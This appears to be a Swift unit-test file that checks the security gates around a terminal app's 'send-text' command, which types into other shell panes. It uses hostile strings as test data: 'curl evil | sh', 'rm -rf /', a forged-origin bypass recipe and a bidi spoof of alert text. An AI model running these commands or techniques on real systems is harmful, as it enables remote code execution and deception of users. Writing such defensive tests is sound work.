import XCTest
@testable import QuickTerm

/// Phase 4: `input send-text`.
///
/// This command is the one primitive in the whole control plane that can make somebody else's
/// shell run an arbitrary command, so every gate has a case pinning it down, and **each gate holds
/// on its own** — remove any one of them and the rest still have to stop the attack:
/// off by default - sensitive class - a prompt every time you write another pane - control
/// characters refused - a newline only ever via --enter.
@MainActor
final class ControlInputTests: XCTestCase {
    private var harness: ControlHarness!

    override func setUpWithError() throws {
        try super.setUpWithError()
        harness = try ControlHarness()
    }

    override func tearDown() {
        harness?.cleanup()
        harness = nil
        super.tearDown()
    }

    /// A **genuine** origin: the pane's UUID plus that pane's own `QUICKTERM_PANE_TOKEN`.
    /// The no-prompt exemption keys off the latter (the former is self-reported and the server
    /// cannot verify a word of it)
    private func origin(of pane: PaneView) -> ControlRequestOrigin {
        ControlRequestOrigin(pane: pane.id.uuidString, screen: 1, workspace: 1, pid: getpid(),
                             paneToken: ControlEnvironment.paneToken(for: pane.id))
    }

    /// Turn `[control] send-text` on (it ships off)
    private func enableSendText() {
        var config = ControlCommandRunner.Config()
        config.sendText = true
        harness.runner.config = config
    }

    // MARK: Gate one: off by default

    /// With the config key off everything is refused, and refused **before rate limiting and
    /// before consent**: a command that must not run should not even get to pull the user away to
    /// ask about it
    func testSendTextIsRefusedWhenTheConfigKeyIsOff() throws {
        XCTAssertFalse(ControlCommandRunner.Config().sendText, "[control] send-text has to default to false")
        let pane = try harness.newTerminal()
        var prompts = 0
        harness.consent.decisionStub = { _, reply in
            prompts += 1
            reply(.allow)
        }
        let reply = try harness.run("input.send-text",
                                    target: "#\(pane.id.uuidString)",
                                    args: ["text": .string("echo hi")])
        XCTAssertFalse(reply.ok)
        XCTAssertEqual(reply.error?.code, ControlErrorCode.disabled.rawValue)
        XCTAssertEqual(reply.error?.exit, ControlExit.denied.rawValue)
        XCTAssertTrue(reply.error?.hint?.contains("send-text = true") ?? false,
                      "the refusal has to say how to turn it on")
        XCTAssertEqual(prompts, 0, "with it off, not even the alert may come up")
    }

    // MARK: Gate two: safety classification

    /// **The command table is the single source of truth**: the moment one command in the `input`
    /// group is not sensitive, that one has slipped past the "off by default" gate inside
    /// `handle()` (which branches on `cls == .sensitive`)
    func testSendTextPathCannotBeReachedWithoutTheSensitiveClassCheck() throws {
        let commands = ControlCommandTable.commands(inGroup: "input")
        XCTAssertFalse(commands.isEmpty)
        for spec in commands {
            XCTAssertEqual(spec.cls, .sensitive, "\(spec.cli) has to be sensitive class")
            XCTAssertTrue(spec.cls.requiresConsent, "sensitive has to land on the side that requires consent")
            XCTAssertTrue(spec.cls.isMutation, "sensitive has to land on the mutation side (readonly mode has to stop it)")
            XCTAssertTrue(spec.acceptsTarget, "\(spec.cli) has to be addressable with -t")
            XCTAssertFalse(spec.examples.isEmpty)
        }
        let spec = try XCTUnwrap(ControlCommandTable.command("input.send-text"))
        XCTAssertEqual(spec.cli, "input send-text")
        XCTAssertFalse(spec.idempotent, "typing twice means it was typed twice; this is not idempotent")
        XCTAssertTrue(spec.summary.contains("off by default"), "the help has to spell out that it is off by default")
        XCTAssertTrue(spec.args.contains { $0.name == "enter" })

        // readonly mode locks it out too (`sensitive.isMutation == true` is how that is done)
        enableSendText()
        var config = harness.runner.config
        config.mode = "readonly"
        harness.runner.config = config
        let pane = try harness.newTerminal()
        let reply = try harness.run("input.send-text", target: "#\(pane.id.uuidString)",
                                    args: ["text": .string("echo hi")])
        XCTAssertFalse(reply.ok)
        XCTAssertEqual(reply.error?.code, ControlErrorCode.disabled.rawValue)
    }

    // MARK: Gate three: consent

    /// **Writing your own pane needs no prompt; writing any other pane prompts every single time.**
    /// "Every time" is literal: destructive commands cache one answer per (pid, class), send-text
    /// caches nothing — the call that was approved last was `git status`, and the next one could
    /// be `curl ... | sh`
    func testSelfNeedsNoPromptWhileAnyOtherPanePromptsEveryTime() throws {
        enableSendText()
        let mine = try harness.newTerminal()
        let other = try harness.newTerminal()
        harness.spin(0.3)

        var prompts = 0
        harness.consent.decisionStub = { _, reply in
            prompts += 1
            reply(.allow)
        }
        let mineOrigin = origin(of: mine)

        // 1. Your own pane (carrying that pane's own pane token): never asked
        for _ in 0..<3 {
            let reply = try harness.run("input.send-text", target: "#\(mine.id.uuidString)",
                                        args: ["text": .string("echo self")],
                                        token: ControlEnvironment.token, origin: mineOrigin)
            XCTAssertTrue(reply.ok, "\(String(describing: reply.error))")
        }
        XCTAssertEqual(prompts, 0, "writing your own pane must not prompt (that tty belongs to the caller already)")

        // 2. Another pane: asked every single time
        for index in 1...3 {
            let reply = try harness.run("input.send-text", target: "#\(other.id.uuidString)",
                                        args: ["text": .string("echo other")],
                                        token: ControlEnvironment.token, origin: mineOrigin)
            XCTAssertTrue(reply.ok, "\(String(describing: reply.error))")
            XCTAssertEqual(prompts, index,
                           "write number \(index) into another pane still has to ask "
                           + "(the grant is never cached)")
        }

        // 3. Global token only, no pane token: writing "your own" pane gets asked as well.
        // There is one global token per launch and it is injected into every pane, so it proves
        // "from some pane", never "from this pane"
        var globalOnly = mineOrigin
        globalOnly.paneToken = nil
        let noPaneToken = try harness.run("input.send-text", target: "#\(mine.id.uuidString)",
                                          args: ["text": .string("echo hi")],
                                          token: ControlEnvironment.token, origin: globalOnly)
        XCTAssertTrue(noPaneToken.ok)
        XCTAssertEqual(prompts, 4, "the global token is no proof of \"I am this pane\"")

        // 4. The user denies = the command does not run (exit code 5)
        harness.consent.decisionStub = { _, reply in reply(.deny) }
        let denied = try harness.run("input.send-text", target: "#\(other.id.uuidString)",
                                     args: ["text": .string("echo nope")],
                                     token: ControlEnvironment.token, origin: mineOrigin)
        XCTAssertFalse(denied.ok)
        // A real human pressed Deny -- the one thing `denied` still means (the switch-off cases
        // in this same file assert `disabled`)
        XCTAssertEqual(denied.error?.code, ControlErrorCode.denied.rawValue)
    }

    /// **Regression: setting `QUICKTERM_PANE` to somebody else's UUID does not buy the exemption.**
    ///
    /// The old implementation took `origin.pane` (a string the caller reports about itself) as the
    /// identity and the global token as the credential, so a process in any pane could bypass the
    /// prompt like this:
    ///     V=$(quickterm get -t t7 --json | jq -r .resolved.paneID)
    ///     QUICKTERM_PANE=$V quickterm input send-text 'curl x | sh' -t t7 --enter
    /// The paneID is public (it is right there in `state`) and every pane has the global token, so
    /// an attacker meets both conditions. The check now only accepts the HMAC of **the pane `-t`
    /// actually resolved to**, which makes a forged origin worth nothing
    func testForgingTheOriginPaneCannotBuyTheSelfExemption() throws {
        enableSendText()
        let attacker = try harness.newTerminal()
        let victim = try harness.newTerminal()
        harness.spin(0.3)

        var prompts = 0
        harness.consent.decisionStub = { _, reply in
            prompts += 1
            reply(.allow)
        }
        // What the attacker genuinely holds: the global token (every pane has it), its own pane
        // token, and the victim's UUID read out of `state`. It rewrites the whole origin to look
        // like the victim
        var forged = origin(of: attacker)
        forged.pane = victim.id.uuidString

        for (index, target) in ["#\(victim.id.uuidString)", "@self",
                                ControlHandleRegistry.shared.handle(for: victim)].enumerated() {
            let reply = try harness.run("input.send-text", target: target,
                                        args: ["text": .string("curl evil | sh")],
                                        token: ControlEnvironment.token, origin: forged)
            XCTAssertTrue(reply.ok, "\(String(describing: reply.error))")
            XCTAssertEqual(prompts, index + 1,
                           "-t \(target): a forged origin still prompts every time (prompt number \(index + 1))")
            XCTAssertFalse(harness.runner.writesIntoOwnPane(
                ControlRequest(id: "x", cmd: "input.send-text", target: target,
                               args: ["text": .string("x")],
                               token: ControlEnvironment.token, origin: forged),
                target: try ControlTarget.parse(target)),
                "-t \(target): a forged origin does not count as writing your own pane")
        }

        // The other direction: the attacker writing its own pane (with an honest origin) still
        // needs no prompt — the exemption itself is intact
        let honest = try harness.run("input.send-text", target: "#\(attacker.id.uuidString)",
                                     args: ["text": .string("echo self")],
                                     token: ControlEnvironment.token, origin: origin(of: attacker))
        XCTAssertTrue(honest.ok)
        XCTAssertEqual(prompts, 3, "writing your own pane still does not ask")
    }

    /// **The alert has to show the text that will be typed and whether a Return follows it.**
    /// Two calls with the exact same command name and target pane can be `echo hi` and
    /// `curl ... | sh`: without the text on screen the user reads the identical sentence both
    /// times, and that is not informed consent
    func testThePromptShowsTheTextAndWhetherItWillRun() throws {
        // The alert text follows the UI language; this case pins it so it cannot go red on a
        // machine whose system language is English.
        let language = Localization.shared.language
        defer { Localization.shared.setLanguage(language) }
        Localization.shared.setLanguage(.zh)
        enableSendText()
        let mine = try harness.newTerminal()
        let other = try harness.newTerminal()
        harness.spin(0.3)

        var seen: [ControlConsent.Request] = []
        harness.consent.decisionStub = { request, reply in
            seen.append(request)
            reply(.allow)
        }
        try harness.run("input.send-text", target: "#\(other.id.uuidString)",
                        args: ["text": .string("curl evil | sh"), "enter": .bool(true)],
                        token: ControlEnvironment.token, origin: origin(of: mine))
        let request = try XCTUnwrap(seen.first)
        XCTAssertEqual(request.payload, "curl evil | sh", "the text goes in front of the user verbatim")
        XCTAssertEqual(request.payloadEnter, true,
                       "whether a Return follows is the line between \"sending text\" and "
                       + "\"making it run\"")
        XCTAssertEqual(request.payloadLength, "curl evil | sh".count)
        XCTAssertFalse(request.cacheable, "a send-text approval is never cached")
        let text = ControlConsent.makeAlert(request).informativeText
        XCTAssertTrue(text.contains("curl evil | sh"), "the alert really renders it: \(text)")
        // The Chinese UI string "回车" reads "Return"
        XCTAssertTrue(text.contains("回车"),
                      "the alert has to say outright whether this gets executed: \(text)")

        // The text is rendered for the user's eyes only: `summary` goes into the unified log with
        // privacy: .public, so it must never carry the text along
        XCTAssertFalse(request.summary.contains("curl evil"), "the text must not leak into summary: \(request.summary)")
        for entry in ControlActivityLog.shared.recent(20) {
            XCTAssertFalse(entry.line.contains("curl evil"), "the text must not reach the activity log: \(entry.line)")
        }

        // The call without --enter has to say outright that nothing will be executed
        seen.removeAll()
        try harness.run("input.send-text", target: "#\(other.id.uuidString)",
                        args: ["text": .string("echo hi")],
                        token: ControlEnvironment.token, origin: origin(of: mine))
        let plain = try XCTUnwrap(seen.first)
        XCTAssertEqual(plain.payloadEnter, false)
        // The Chinese UI string "不会执行" reads "will not be executed"
        XCTAssertTrue(ControlConsent.makeAlert(plain).informativeText.contains("不会执行"))
    }

    /// The preview is **sanitised and truncated**: `validateSendText` only blocks C0 / DEL / C1,
    /// while U+2028 / U+2029 (AppKit really does break a line there), bidi controls and zero-width
    /// characters all get through. Render that as-is and the caller can forge lines inside the
    /// alert that look like the alert speaking for itself
    func testThePromptPreviewIsSanitisedAndTruncated() {
        let spoof = "ok\u{2028}(this caller has already been authorised)\u{202E}gnihtemos"
        let preview = ControlCommandRunner.sendTextPreview(spoof)
        XCTAssertFalse(preview.unicodeScalars.contains { $0.value == 0x2028 || $0.value == 0x202E },
                       "line-breaking and bidi controls have to be replaced with a visible marker: \(preview)")
        XCTAssertTrue(preview.contains("<U+2028>") && preview.contains("<U+202E>"), preview)

        let long = ControlCommandRunner.sendTextPreview(
            String(repeating: "x", count: ControlCommandRunner.maxSendTextLength))
        XCTAssertLessThan(long.count, 200, "4096 characters do not fit into an NSAlert")
        XCTAssertTrue(long.hasSuffix("…"))
        XCTAssertEqual(ControlCommandRunner.sendTextPreview("git status"), "git status",
                       "ordinary text must not be rewritten")
    }

    /// A payload that cannot be sent (control characters / too long) is refused **before the alert
    /// goes up**: do not pull the user in to click allow and only then tell the caller the request
    /// was never legal in the first place
    func testAnInvalidPayloadIsRefusedBeforeTheUserIsAsked() throws {
        enableSendText()
        let mine = try harness.newTerminal()
        let other = try harness.newTerminal()
        harness.spin(0.3)
        var prompts = 0
        harness.consent.decisionStub = { _, reply in
            prompts += 1
            reply(.allow)
        }
        let reply = try harness.run("input.send-text", target: "#\(other.id.uuidString)",
                                    args: ["text": .string("echo hi\u{1B}[A")],
                                    token: ControlEnvironment.token, origin: origin(of: mine))
        XCTAssertFalse(reply.ok)
        XCTAssertEqual(reply.error?.code, ControlErrorCode.badRequest.rawValue)
        XCTAssertEqual(prompts, 0, "an illegal payload must not disturb the user")
    }

    /// The exemption is decided by **identity**, not by spelling: `-t @self` and
    /// `-t <your own handle>` are treated alike, while somebody else's handle never gets it
    func testSelfExemptionComparesPaneIdentityNotSpelling() throws {
        enableSendText()
        let mine = try harness.newTerminal()
        let other = try harness.newTerminal()
        harness.spin(0.3)
        let mineOrigin = origin(of: mine)
        let request = { (target: String) in
            ControlRequest(id: "x", cmd: "input.send-text", target: target,
                           args: ["text": .string("echo hi")],
                           token: ControlEnvironment.token, origin: mineOrigin)
        }
        XCTAssertTrue(harness.runner.writesIntoOwnPane(request("@self"),
                                                       target: try ControlTarget.parse("@self")))
        let mineHandle = ControlHandleRegistry.shared.handle(for: mine)
        XCTAssertTrue(harness.runner.writesIntoOwnPane(request(mineHandle),
                                                       target: try ControlTarget.parse(mineHandle)),
                      "writing your own handle and writing @self are the same thing")
        let otherHandle = ControlHandleRegistry.shared.handle(for: other)
        XCTAssertFalse(harness.runner.writesIntoOwnPane(request(otherHandle),
                                                        target: try ControlTarget.parse(otherHandle)))
        // Wrong pane token: no exemption, no matter how correct the global token is
        var forged = request("@self")
        forged.origin?.paneToken = String(repeating: "0", count: 64)
        XCTAssertFalse(harness.runner.writesIntoOwnPane(forged, target: try ControlTarget.parse("@self")))
        forged.origin?.paneToken = nil
        XCTAssertFalse(harness.runner.writesIntoOwnPane(forged, target: try ControlTarget.parse("@self")))
        // Holding **somebody else's**: no exemption either (it matches their pane, not this one)
        forged.origin?.paneToken = ControlEnvironment.paneToken(for: other.id)
        XCTAssertFalse(harness.runner.writesIntoOwnPane(forged, target: try ControlTarget.parse("@self")))
    }

    // MARK: Gate four: control characters and newlines

    /// Control characters are **refused**, and refused rather than filtered: quietly stripping a
    /// character leaves the caller believing it sent the string it wrote, while a different string
    /// arrived at the shell
    func testControlCharactersAreRejected() throws {
        for bad in ["echo hi\n", "echo hi\r", "a\tb", "\u{1B}[A", "\u{03}", "x\u{7F}", "a\u{85}b"] {
            XCTAssertThrowsError(try ControlCommandRunner.validateSendText(bad),
                                 "control characters have to be rejected: \(bad.debugDescription)") { error in
                let body = error as? ControlErrorBody
                XCTAssertEqual(body?.code, ControlErrorCode.badRequest.rawValue)
                XCTAssertNotNil(body?.hint)
            }
        }
        // Visible text passes, CJK, emoji and quotes included
        for good in ["git status", "echo '你好'", "ls -la ~/proj", "printf %s 🚀"] {
            XCTAssertNoThrow(try ControlCommandRunner.validateSendText(good))
        }
        // The length cap
        XCTAssertThrowsError(try ControlCommandRunner.validateSendText(
            String(repeating: "x", count: ControlCommandRunner.maxSendTextLength + 1)))
    }

    /// **`--enter` is the only way to send a newline**, which makes it the only way to "actually
    /// make the shell run it". Without that rule, a call that "only meant to fill in a prompt"
    /// executes the command on the way past
    func testEnterIsTheOnlyWayToSendANewline() throws {
        enableSendText()
        let pane = try harness.newTerminal()
        harness.spin(0.3)
        let paneOrigin = origin(of: pane)
        let target = "#\(pane.id.uuidString)"

        // A \n inside the text is always refused
        let newline = try harness.run("input.send-text", target: target,
                                      args: ["text": .string("echo hi\n")],
                                      token: ControlEnvironment.token, origin: paneOrigin)
        XCTAssertFalse(newline.ok)
        XCTAssertEqual(newline.error?.code, ControlErrorCode.badRequest.rawValue)
        XCTAssertTrue(newline.error?.hint?.contains("--enter") ?? false,
                      "the refusal points at --enter: that is the only way to make it run")

        // Without --enter: the text is sent, no Return
        let plain = try harness.mutation(try harness.run(
            "input.send-text", target: target, args: ["text": .string("echo hi")],
            token: ControlEnvironment.token, origin: paneOrigin))
        XCTAssertEqual(plain["applied"]?.boolValue, true)
        let plainDiff = try XCTUnwrap(plain["changes"]?.arrayValue?.first?.objectValue?["to"]?.stringValue)
        XCTAssertTrue(plainDiff.contains("(no Return)"),
                      "without --enter the diff says outright that there is no Return: \(plainDiff)")

        // With --enter: the diff spells out the extra Return that went along
        let entered = try harness.mutation(try harness.run(
            "input.send-text", target: target,
            args: ["text": .string("echo hi"), "enter": .bool(true)],
            token: ControlEnvironment.token, origin: paneOrigin))
        let enterDiff = try XCTUnwrap(entered["changes"]?.arrayValue?.first?.objectValue?["to"]?.stringValue)
        XCTAssertTrue(enterDiff.contains("+ Return"), "\(enterDiff)")
        XCTAssertFalse(enterDiff.contains("no Return"))
    }

    // MARK: Other invariants

    /// `--dry-run` sends no characters at all and **therefore does not ask** (the alert asks
    /// whether to go ahead, and nothing is going ahead)
    func testDryRunSendsNothingAndDoesNotPrompt() throws {
        enableSendText()
        let pane = try harness.newTerminal()
        let other = try harness.newTerminal()
        harness.spin(0.3)
        var prompts = 0
        harness.consent.decisionStub = { _, reply in
            prompts += 1
            reply(.allow)
        }
        _ = pane
        let data = try harness.mutation(try harness.run(
            "input.send-text", target: "#\(other.id.uuidString)",
            args: ["text": .string("rm -rf /"), ControlCommandTable.Flag.dryRun: .bool(true)]))
        XCTAssertEqual(data["applied"]?.boolValue, false, "a dry run must never actually strike")
        XCTAssertEqual(data["dryRun"]?.boolValue, true)
        XCTAssertEqual(prompts, 0, "a dry run changes nothing, so there is nothing to ask about")
    }

    /// The target has to be spelled out. Everywhere else the default lands on "the focused pane",
    /// which here would mean "type into whichever shell happens to be focused right now" — and an
    /// agent cannot see the focus
    func testAnExplicitTargetIsRequired() throws {
        enableSendText()
        try harness.newTerminal()
        harness.spin(0.3)
        let reply = try harness.run("input.send-text", args: ["text": .string("echo hi")])
        XCTAssertFalse(reply.ok)
        XCTAssertEqual(reply.error?.code, ControlErrorCode.badTarget.rawValue)
        XCTAssertTrue(reply.error?.hint?.contains("@self") ?? false)
    }

    /// A browser pane has no tty: report wrong_pane_kind explicitly instead of silently doing
    /// nothing
    func testBrowserPanesCannotReceiveText() throws {
        enableSendText()
        let controller = try harness.controller
        let before = Set(controller.model.allPanes.map(\.id))
        controller.perform(.newBrowser)
        harness.spin(0.5)
        guard let browser = controller.model.allPanes.first(where: { !before.contains($0.id) })
        else { throw XCTSkip("could not create a browser pane") }
        harness.track(browser)

        let reply = try harness.run("input.send-text", target: "#\(browser.id.uuidString)",
                                    args: ["text": .string("echo hi")])
        XCTAssertFalse(reply.ok)
        XCTAssertEqual(reply.error?.code, ControlErrorCode.wrongPaneKind.rawValue)
    }

    /// The text that was sent **never reaches the log**: the activity log is kept for a long time,
    /// and the text is very often the command line itself
    func testTheTextItselfNeverReachesTheActivityLog() throws {
        enableSendText()
        let pane = try harness.newTerminal()
        harness.spin(0.3)
        let secret = "export TOKEN=sk-do-not-log-me"
        let paneOrigin = origin(of: pane)
        try harness.run("input.send-text", target: "#\(pane.id.uuidString)",
                        args: ["text": .string(secret)],
                        token: ControlEnvironment.token, origin: paneOrigin)
        for entry in ControlActivityLog.shared.recent(20) {
            XCTAssertFalse(entry.line.contains("sk-do-not-log-me"),
                           "the log records the character count only, never the text: \(entry.line)")
        }
        XCTAssertTrue(ControlActivityLog.shared.recent(20).contains { $0.command == "input.send-text" },
                      "the command itself still has to leave a trace -- silent execution is only "
                      + "acceptable when it is visible afterwards")
    }

    /// Characters typed into a shell are **not undoable**: registering an undo entry would only
    /// make the user believe Cmd+Z can take the command back
    func testSendTextIsNotUndoable() throws {
        enableSendText()
        let pane = try harness.newTerminal()
        harness.spin(0.3)
        let paneOrigin = origin(of: pane)
        let data = try harness.mutation(try harness.run(
            "input.send-text", target: "#\(pane.id.uuidString)",
            args: ["text": .string("echo hi")],
            token: ControlEnvironment.token, origin: paneOrigin))
        XCTAssertNil(data["undo"]?.stringValue, "send-text must not register an undo entry")
    }
}
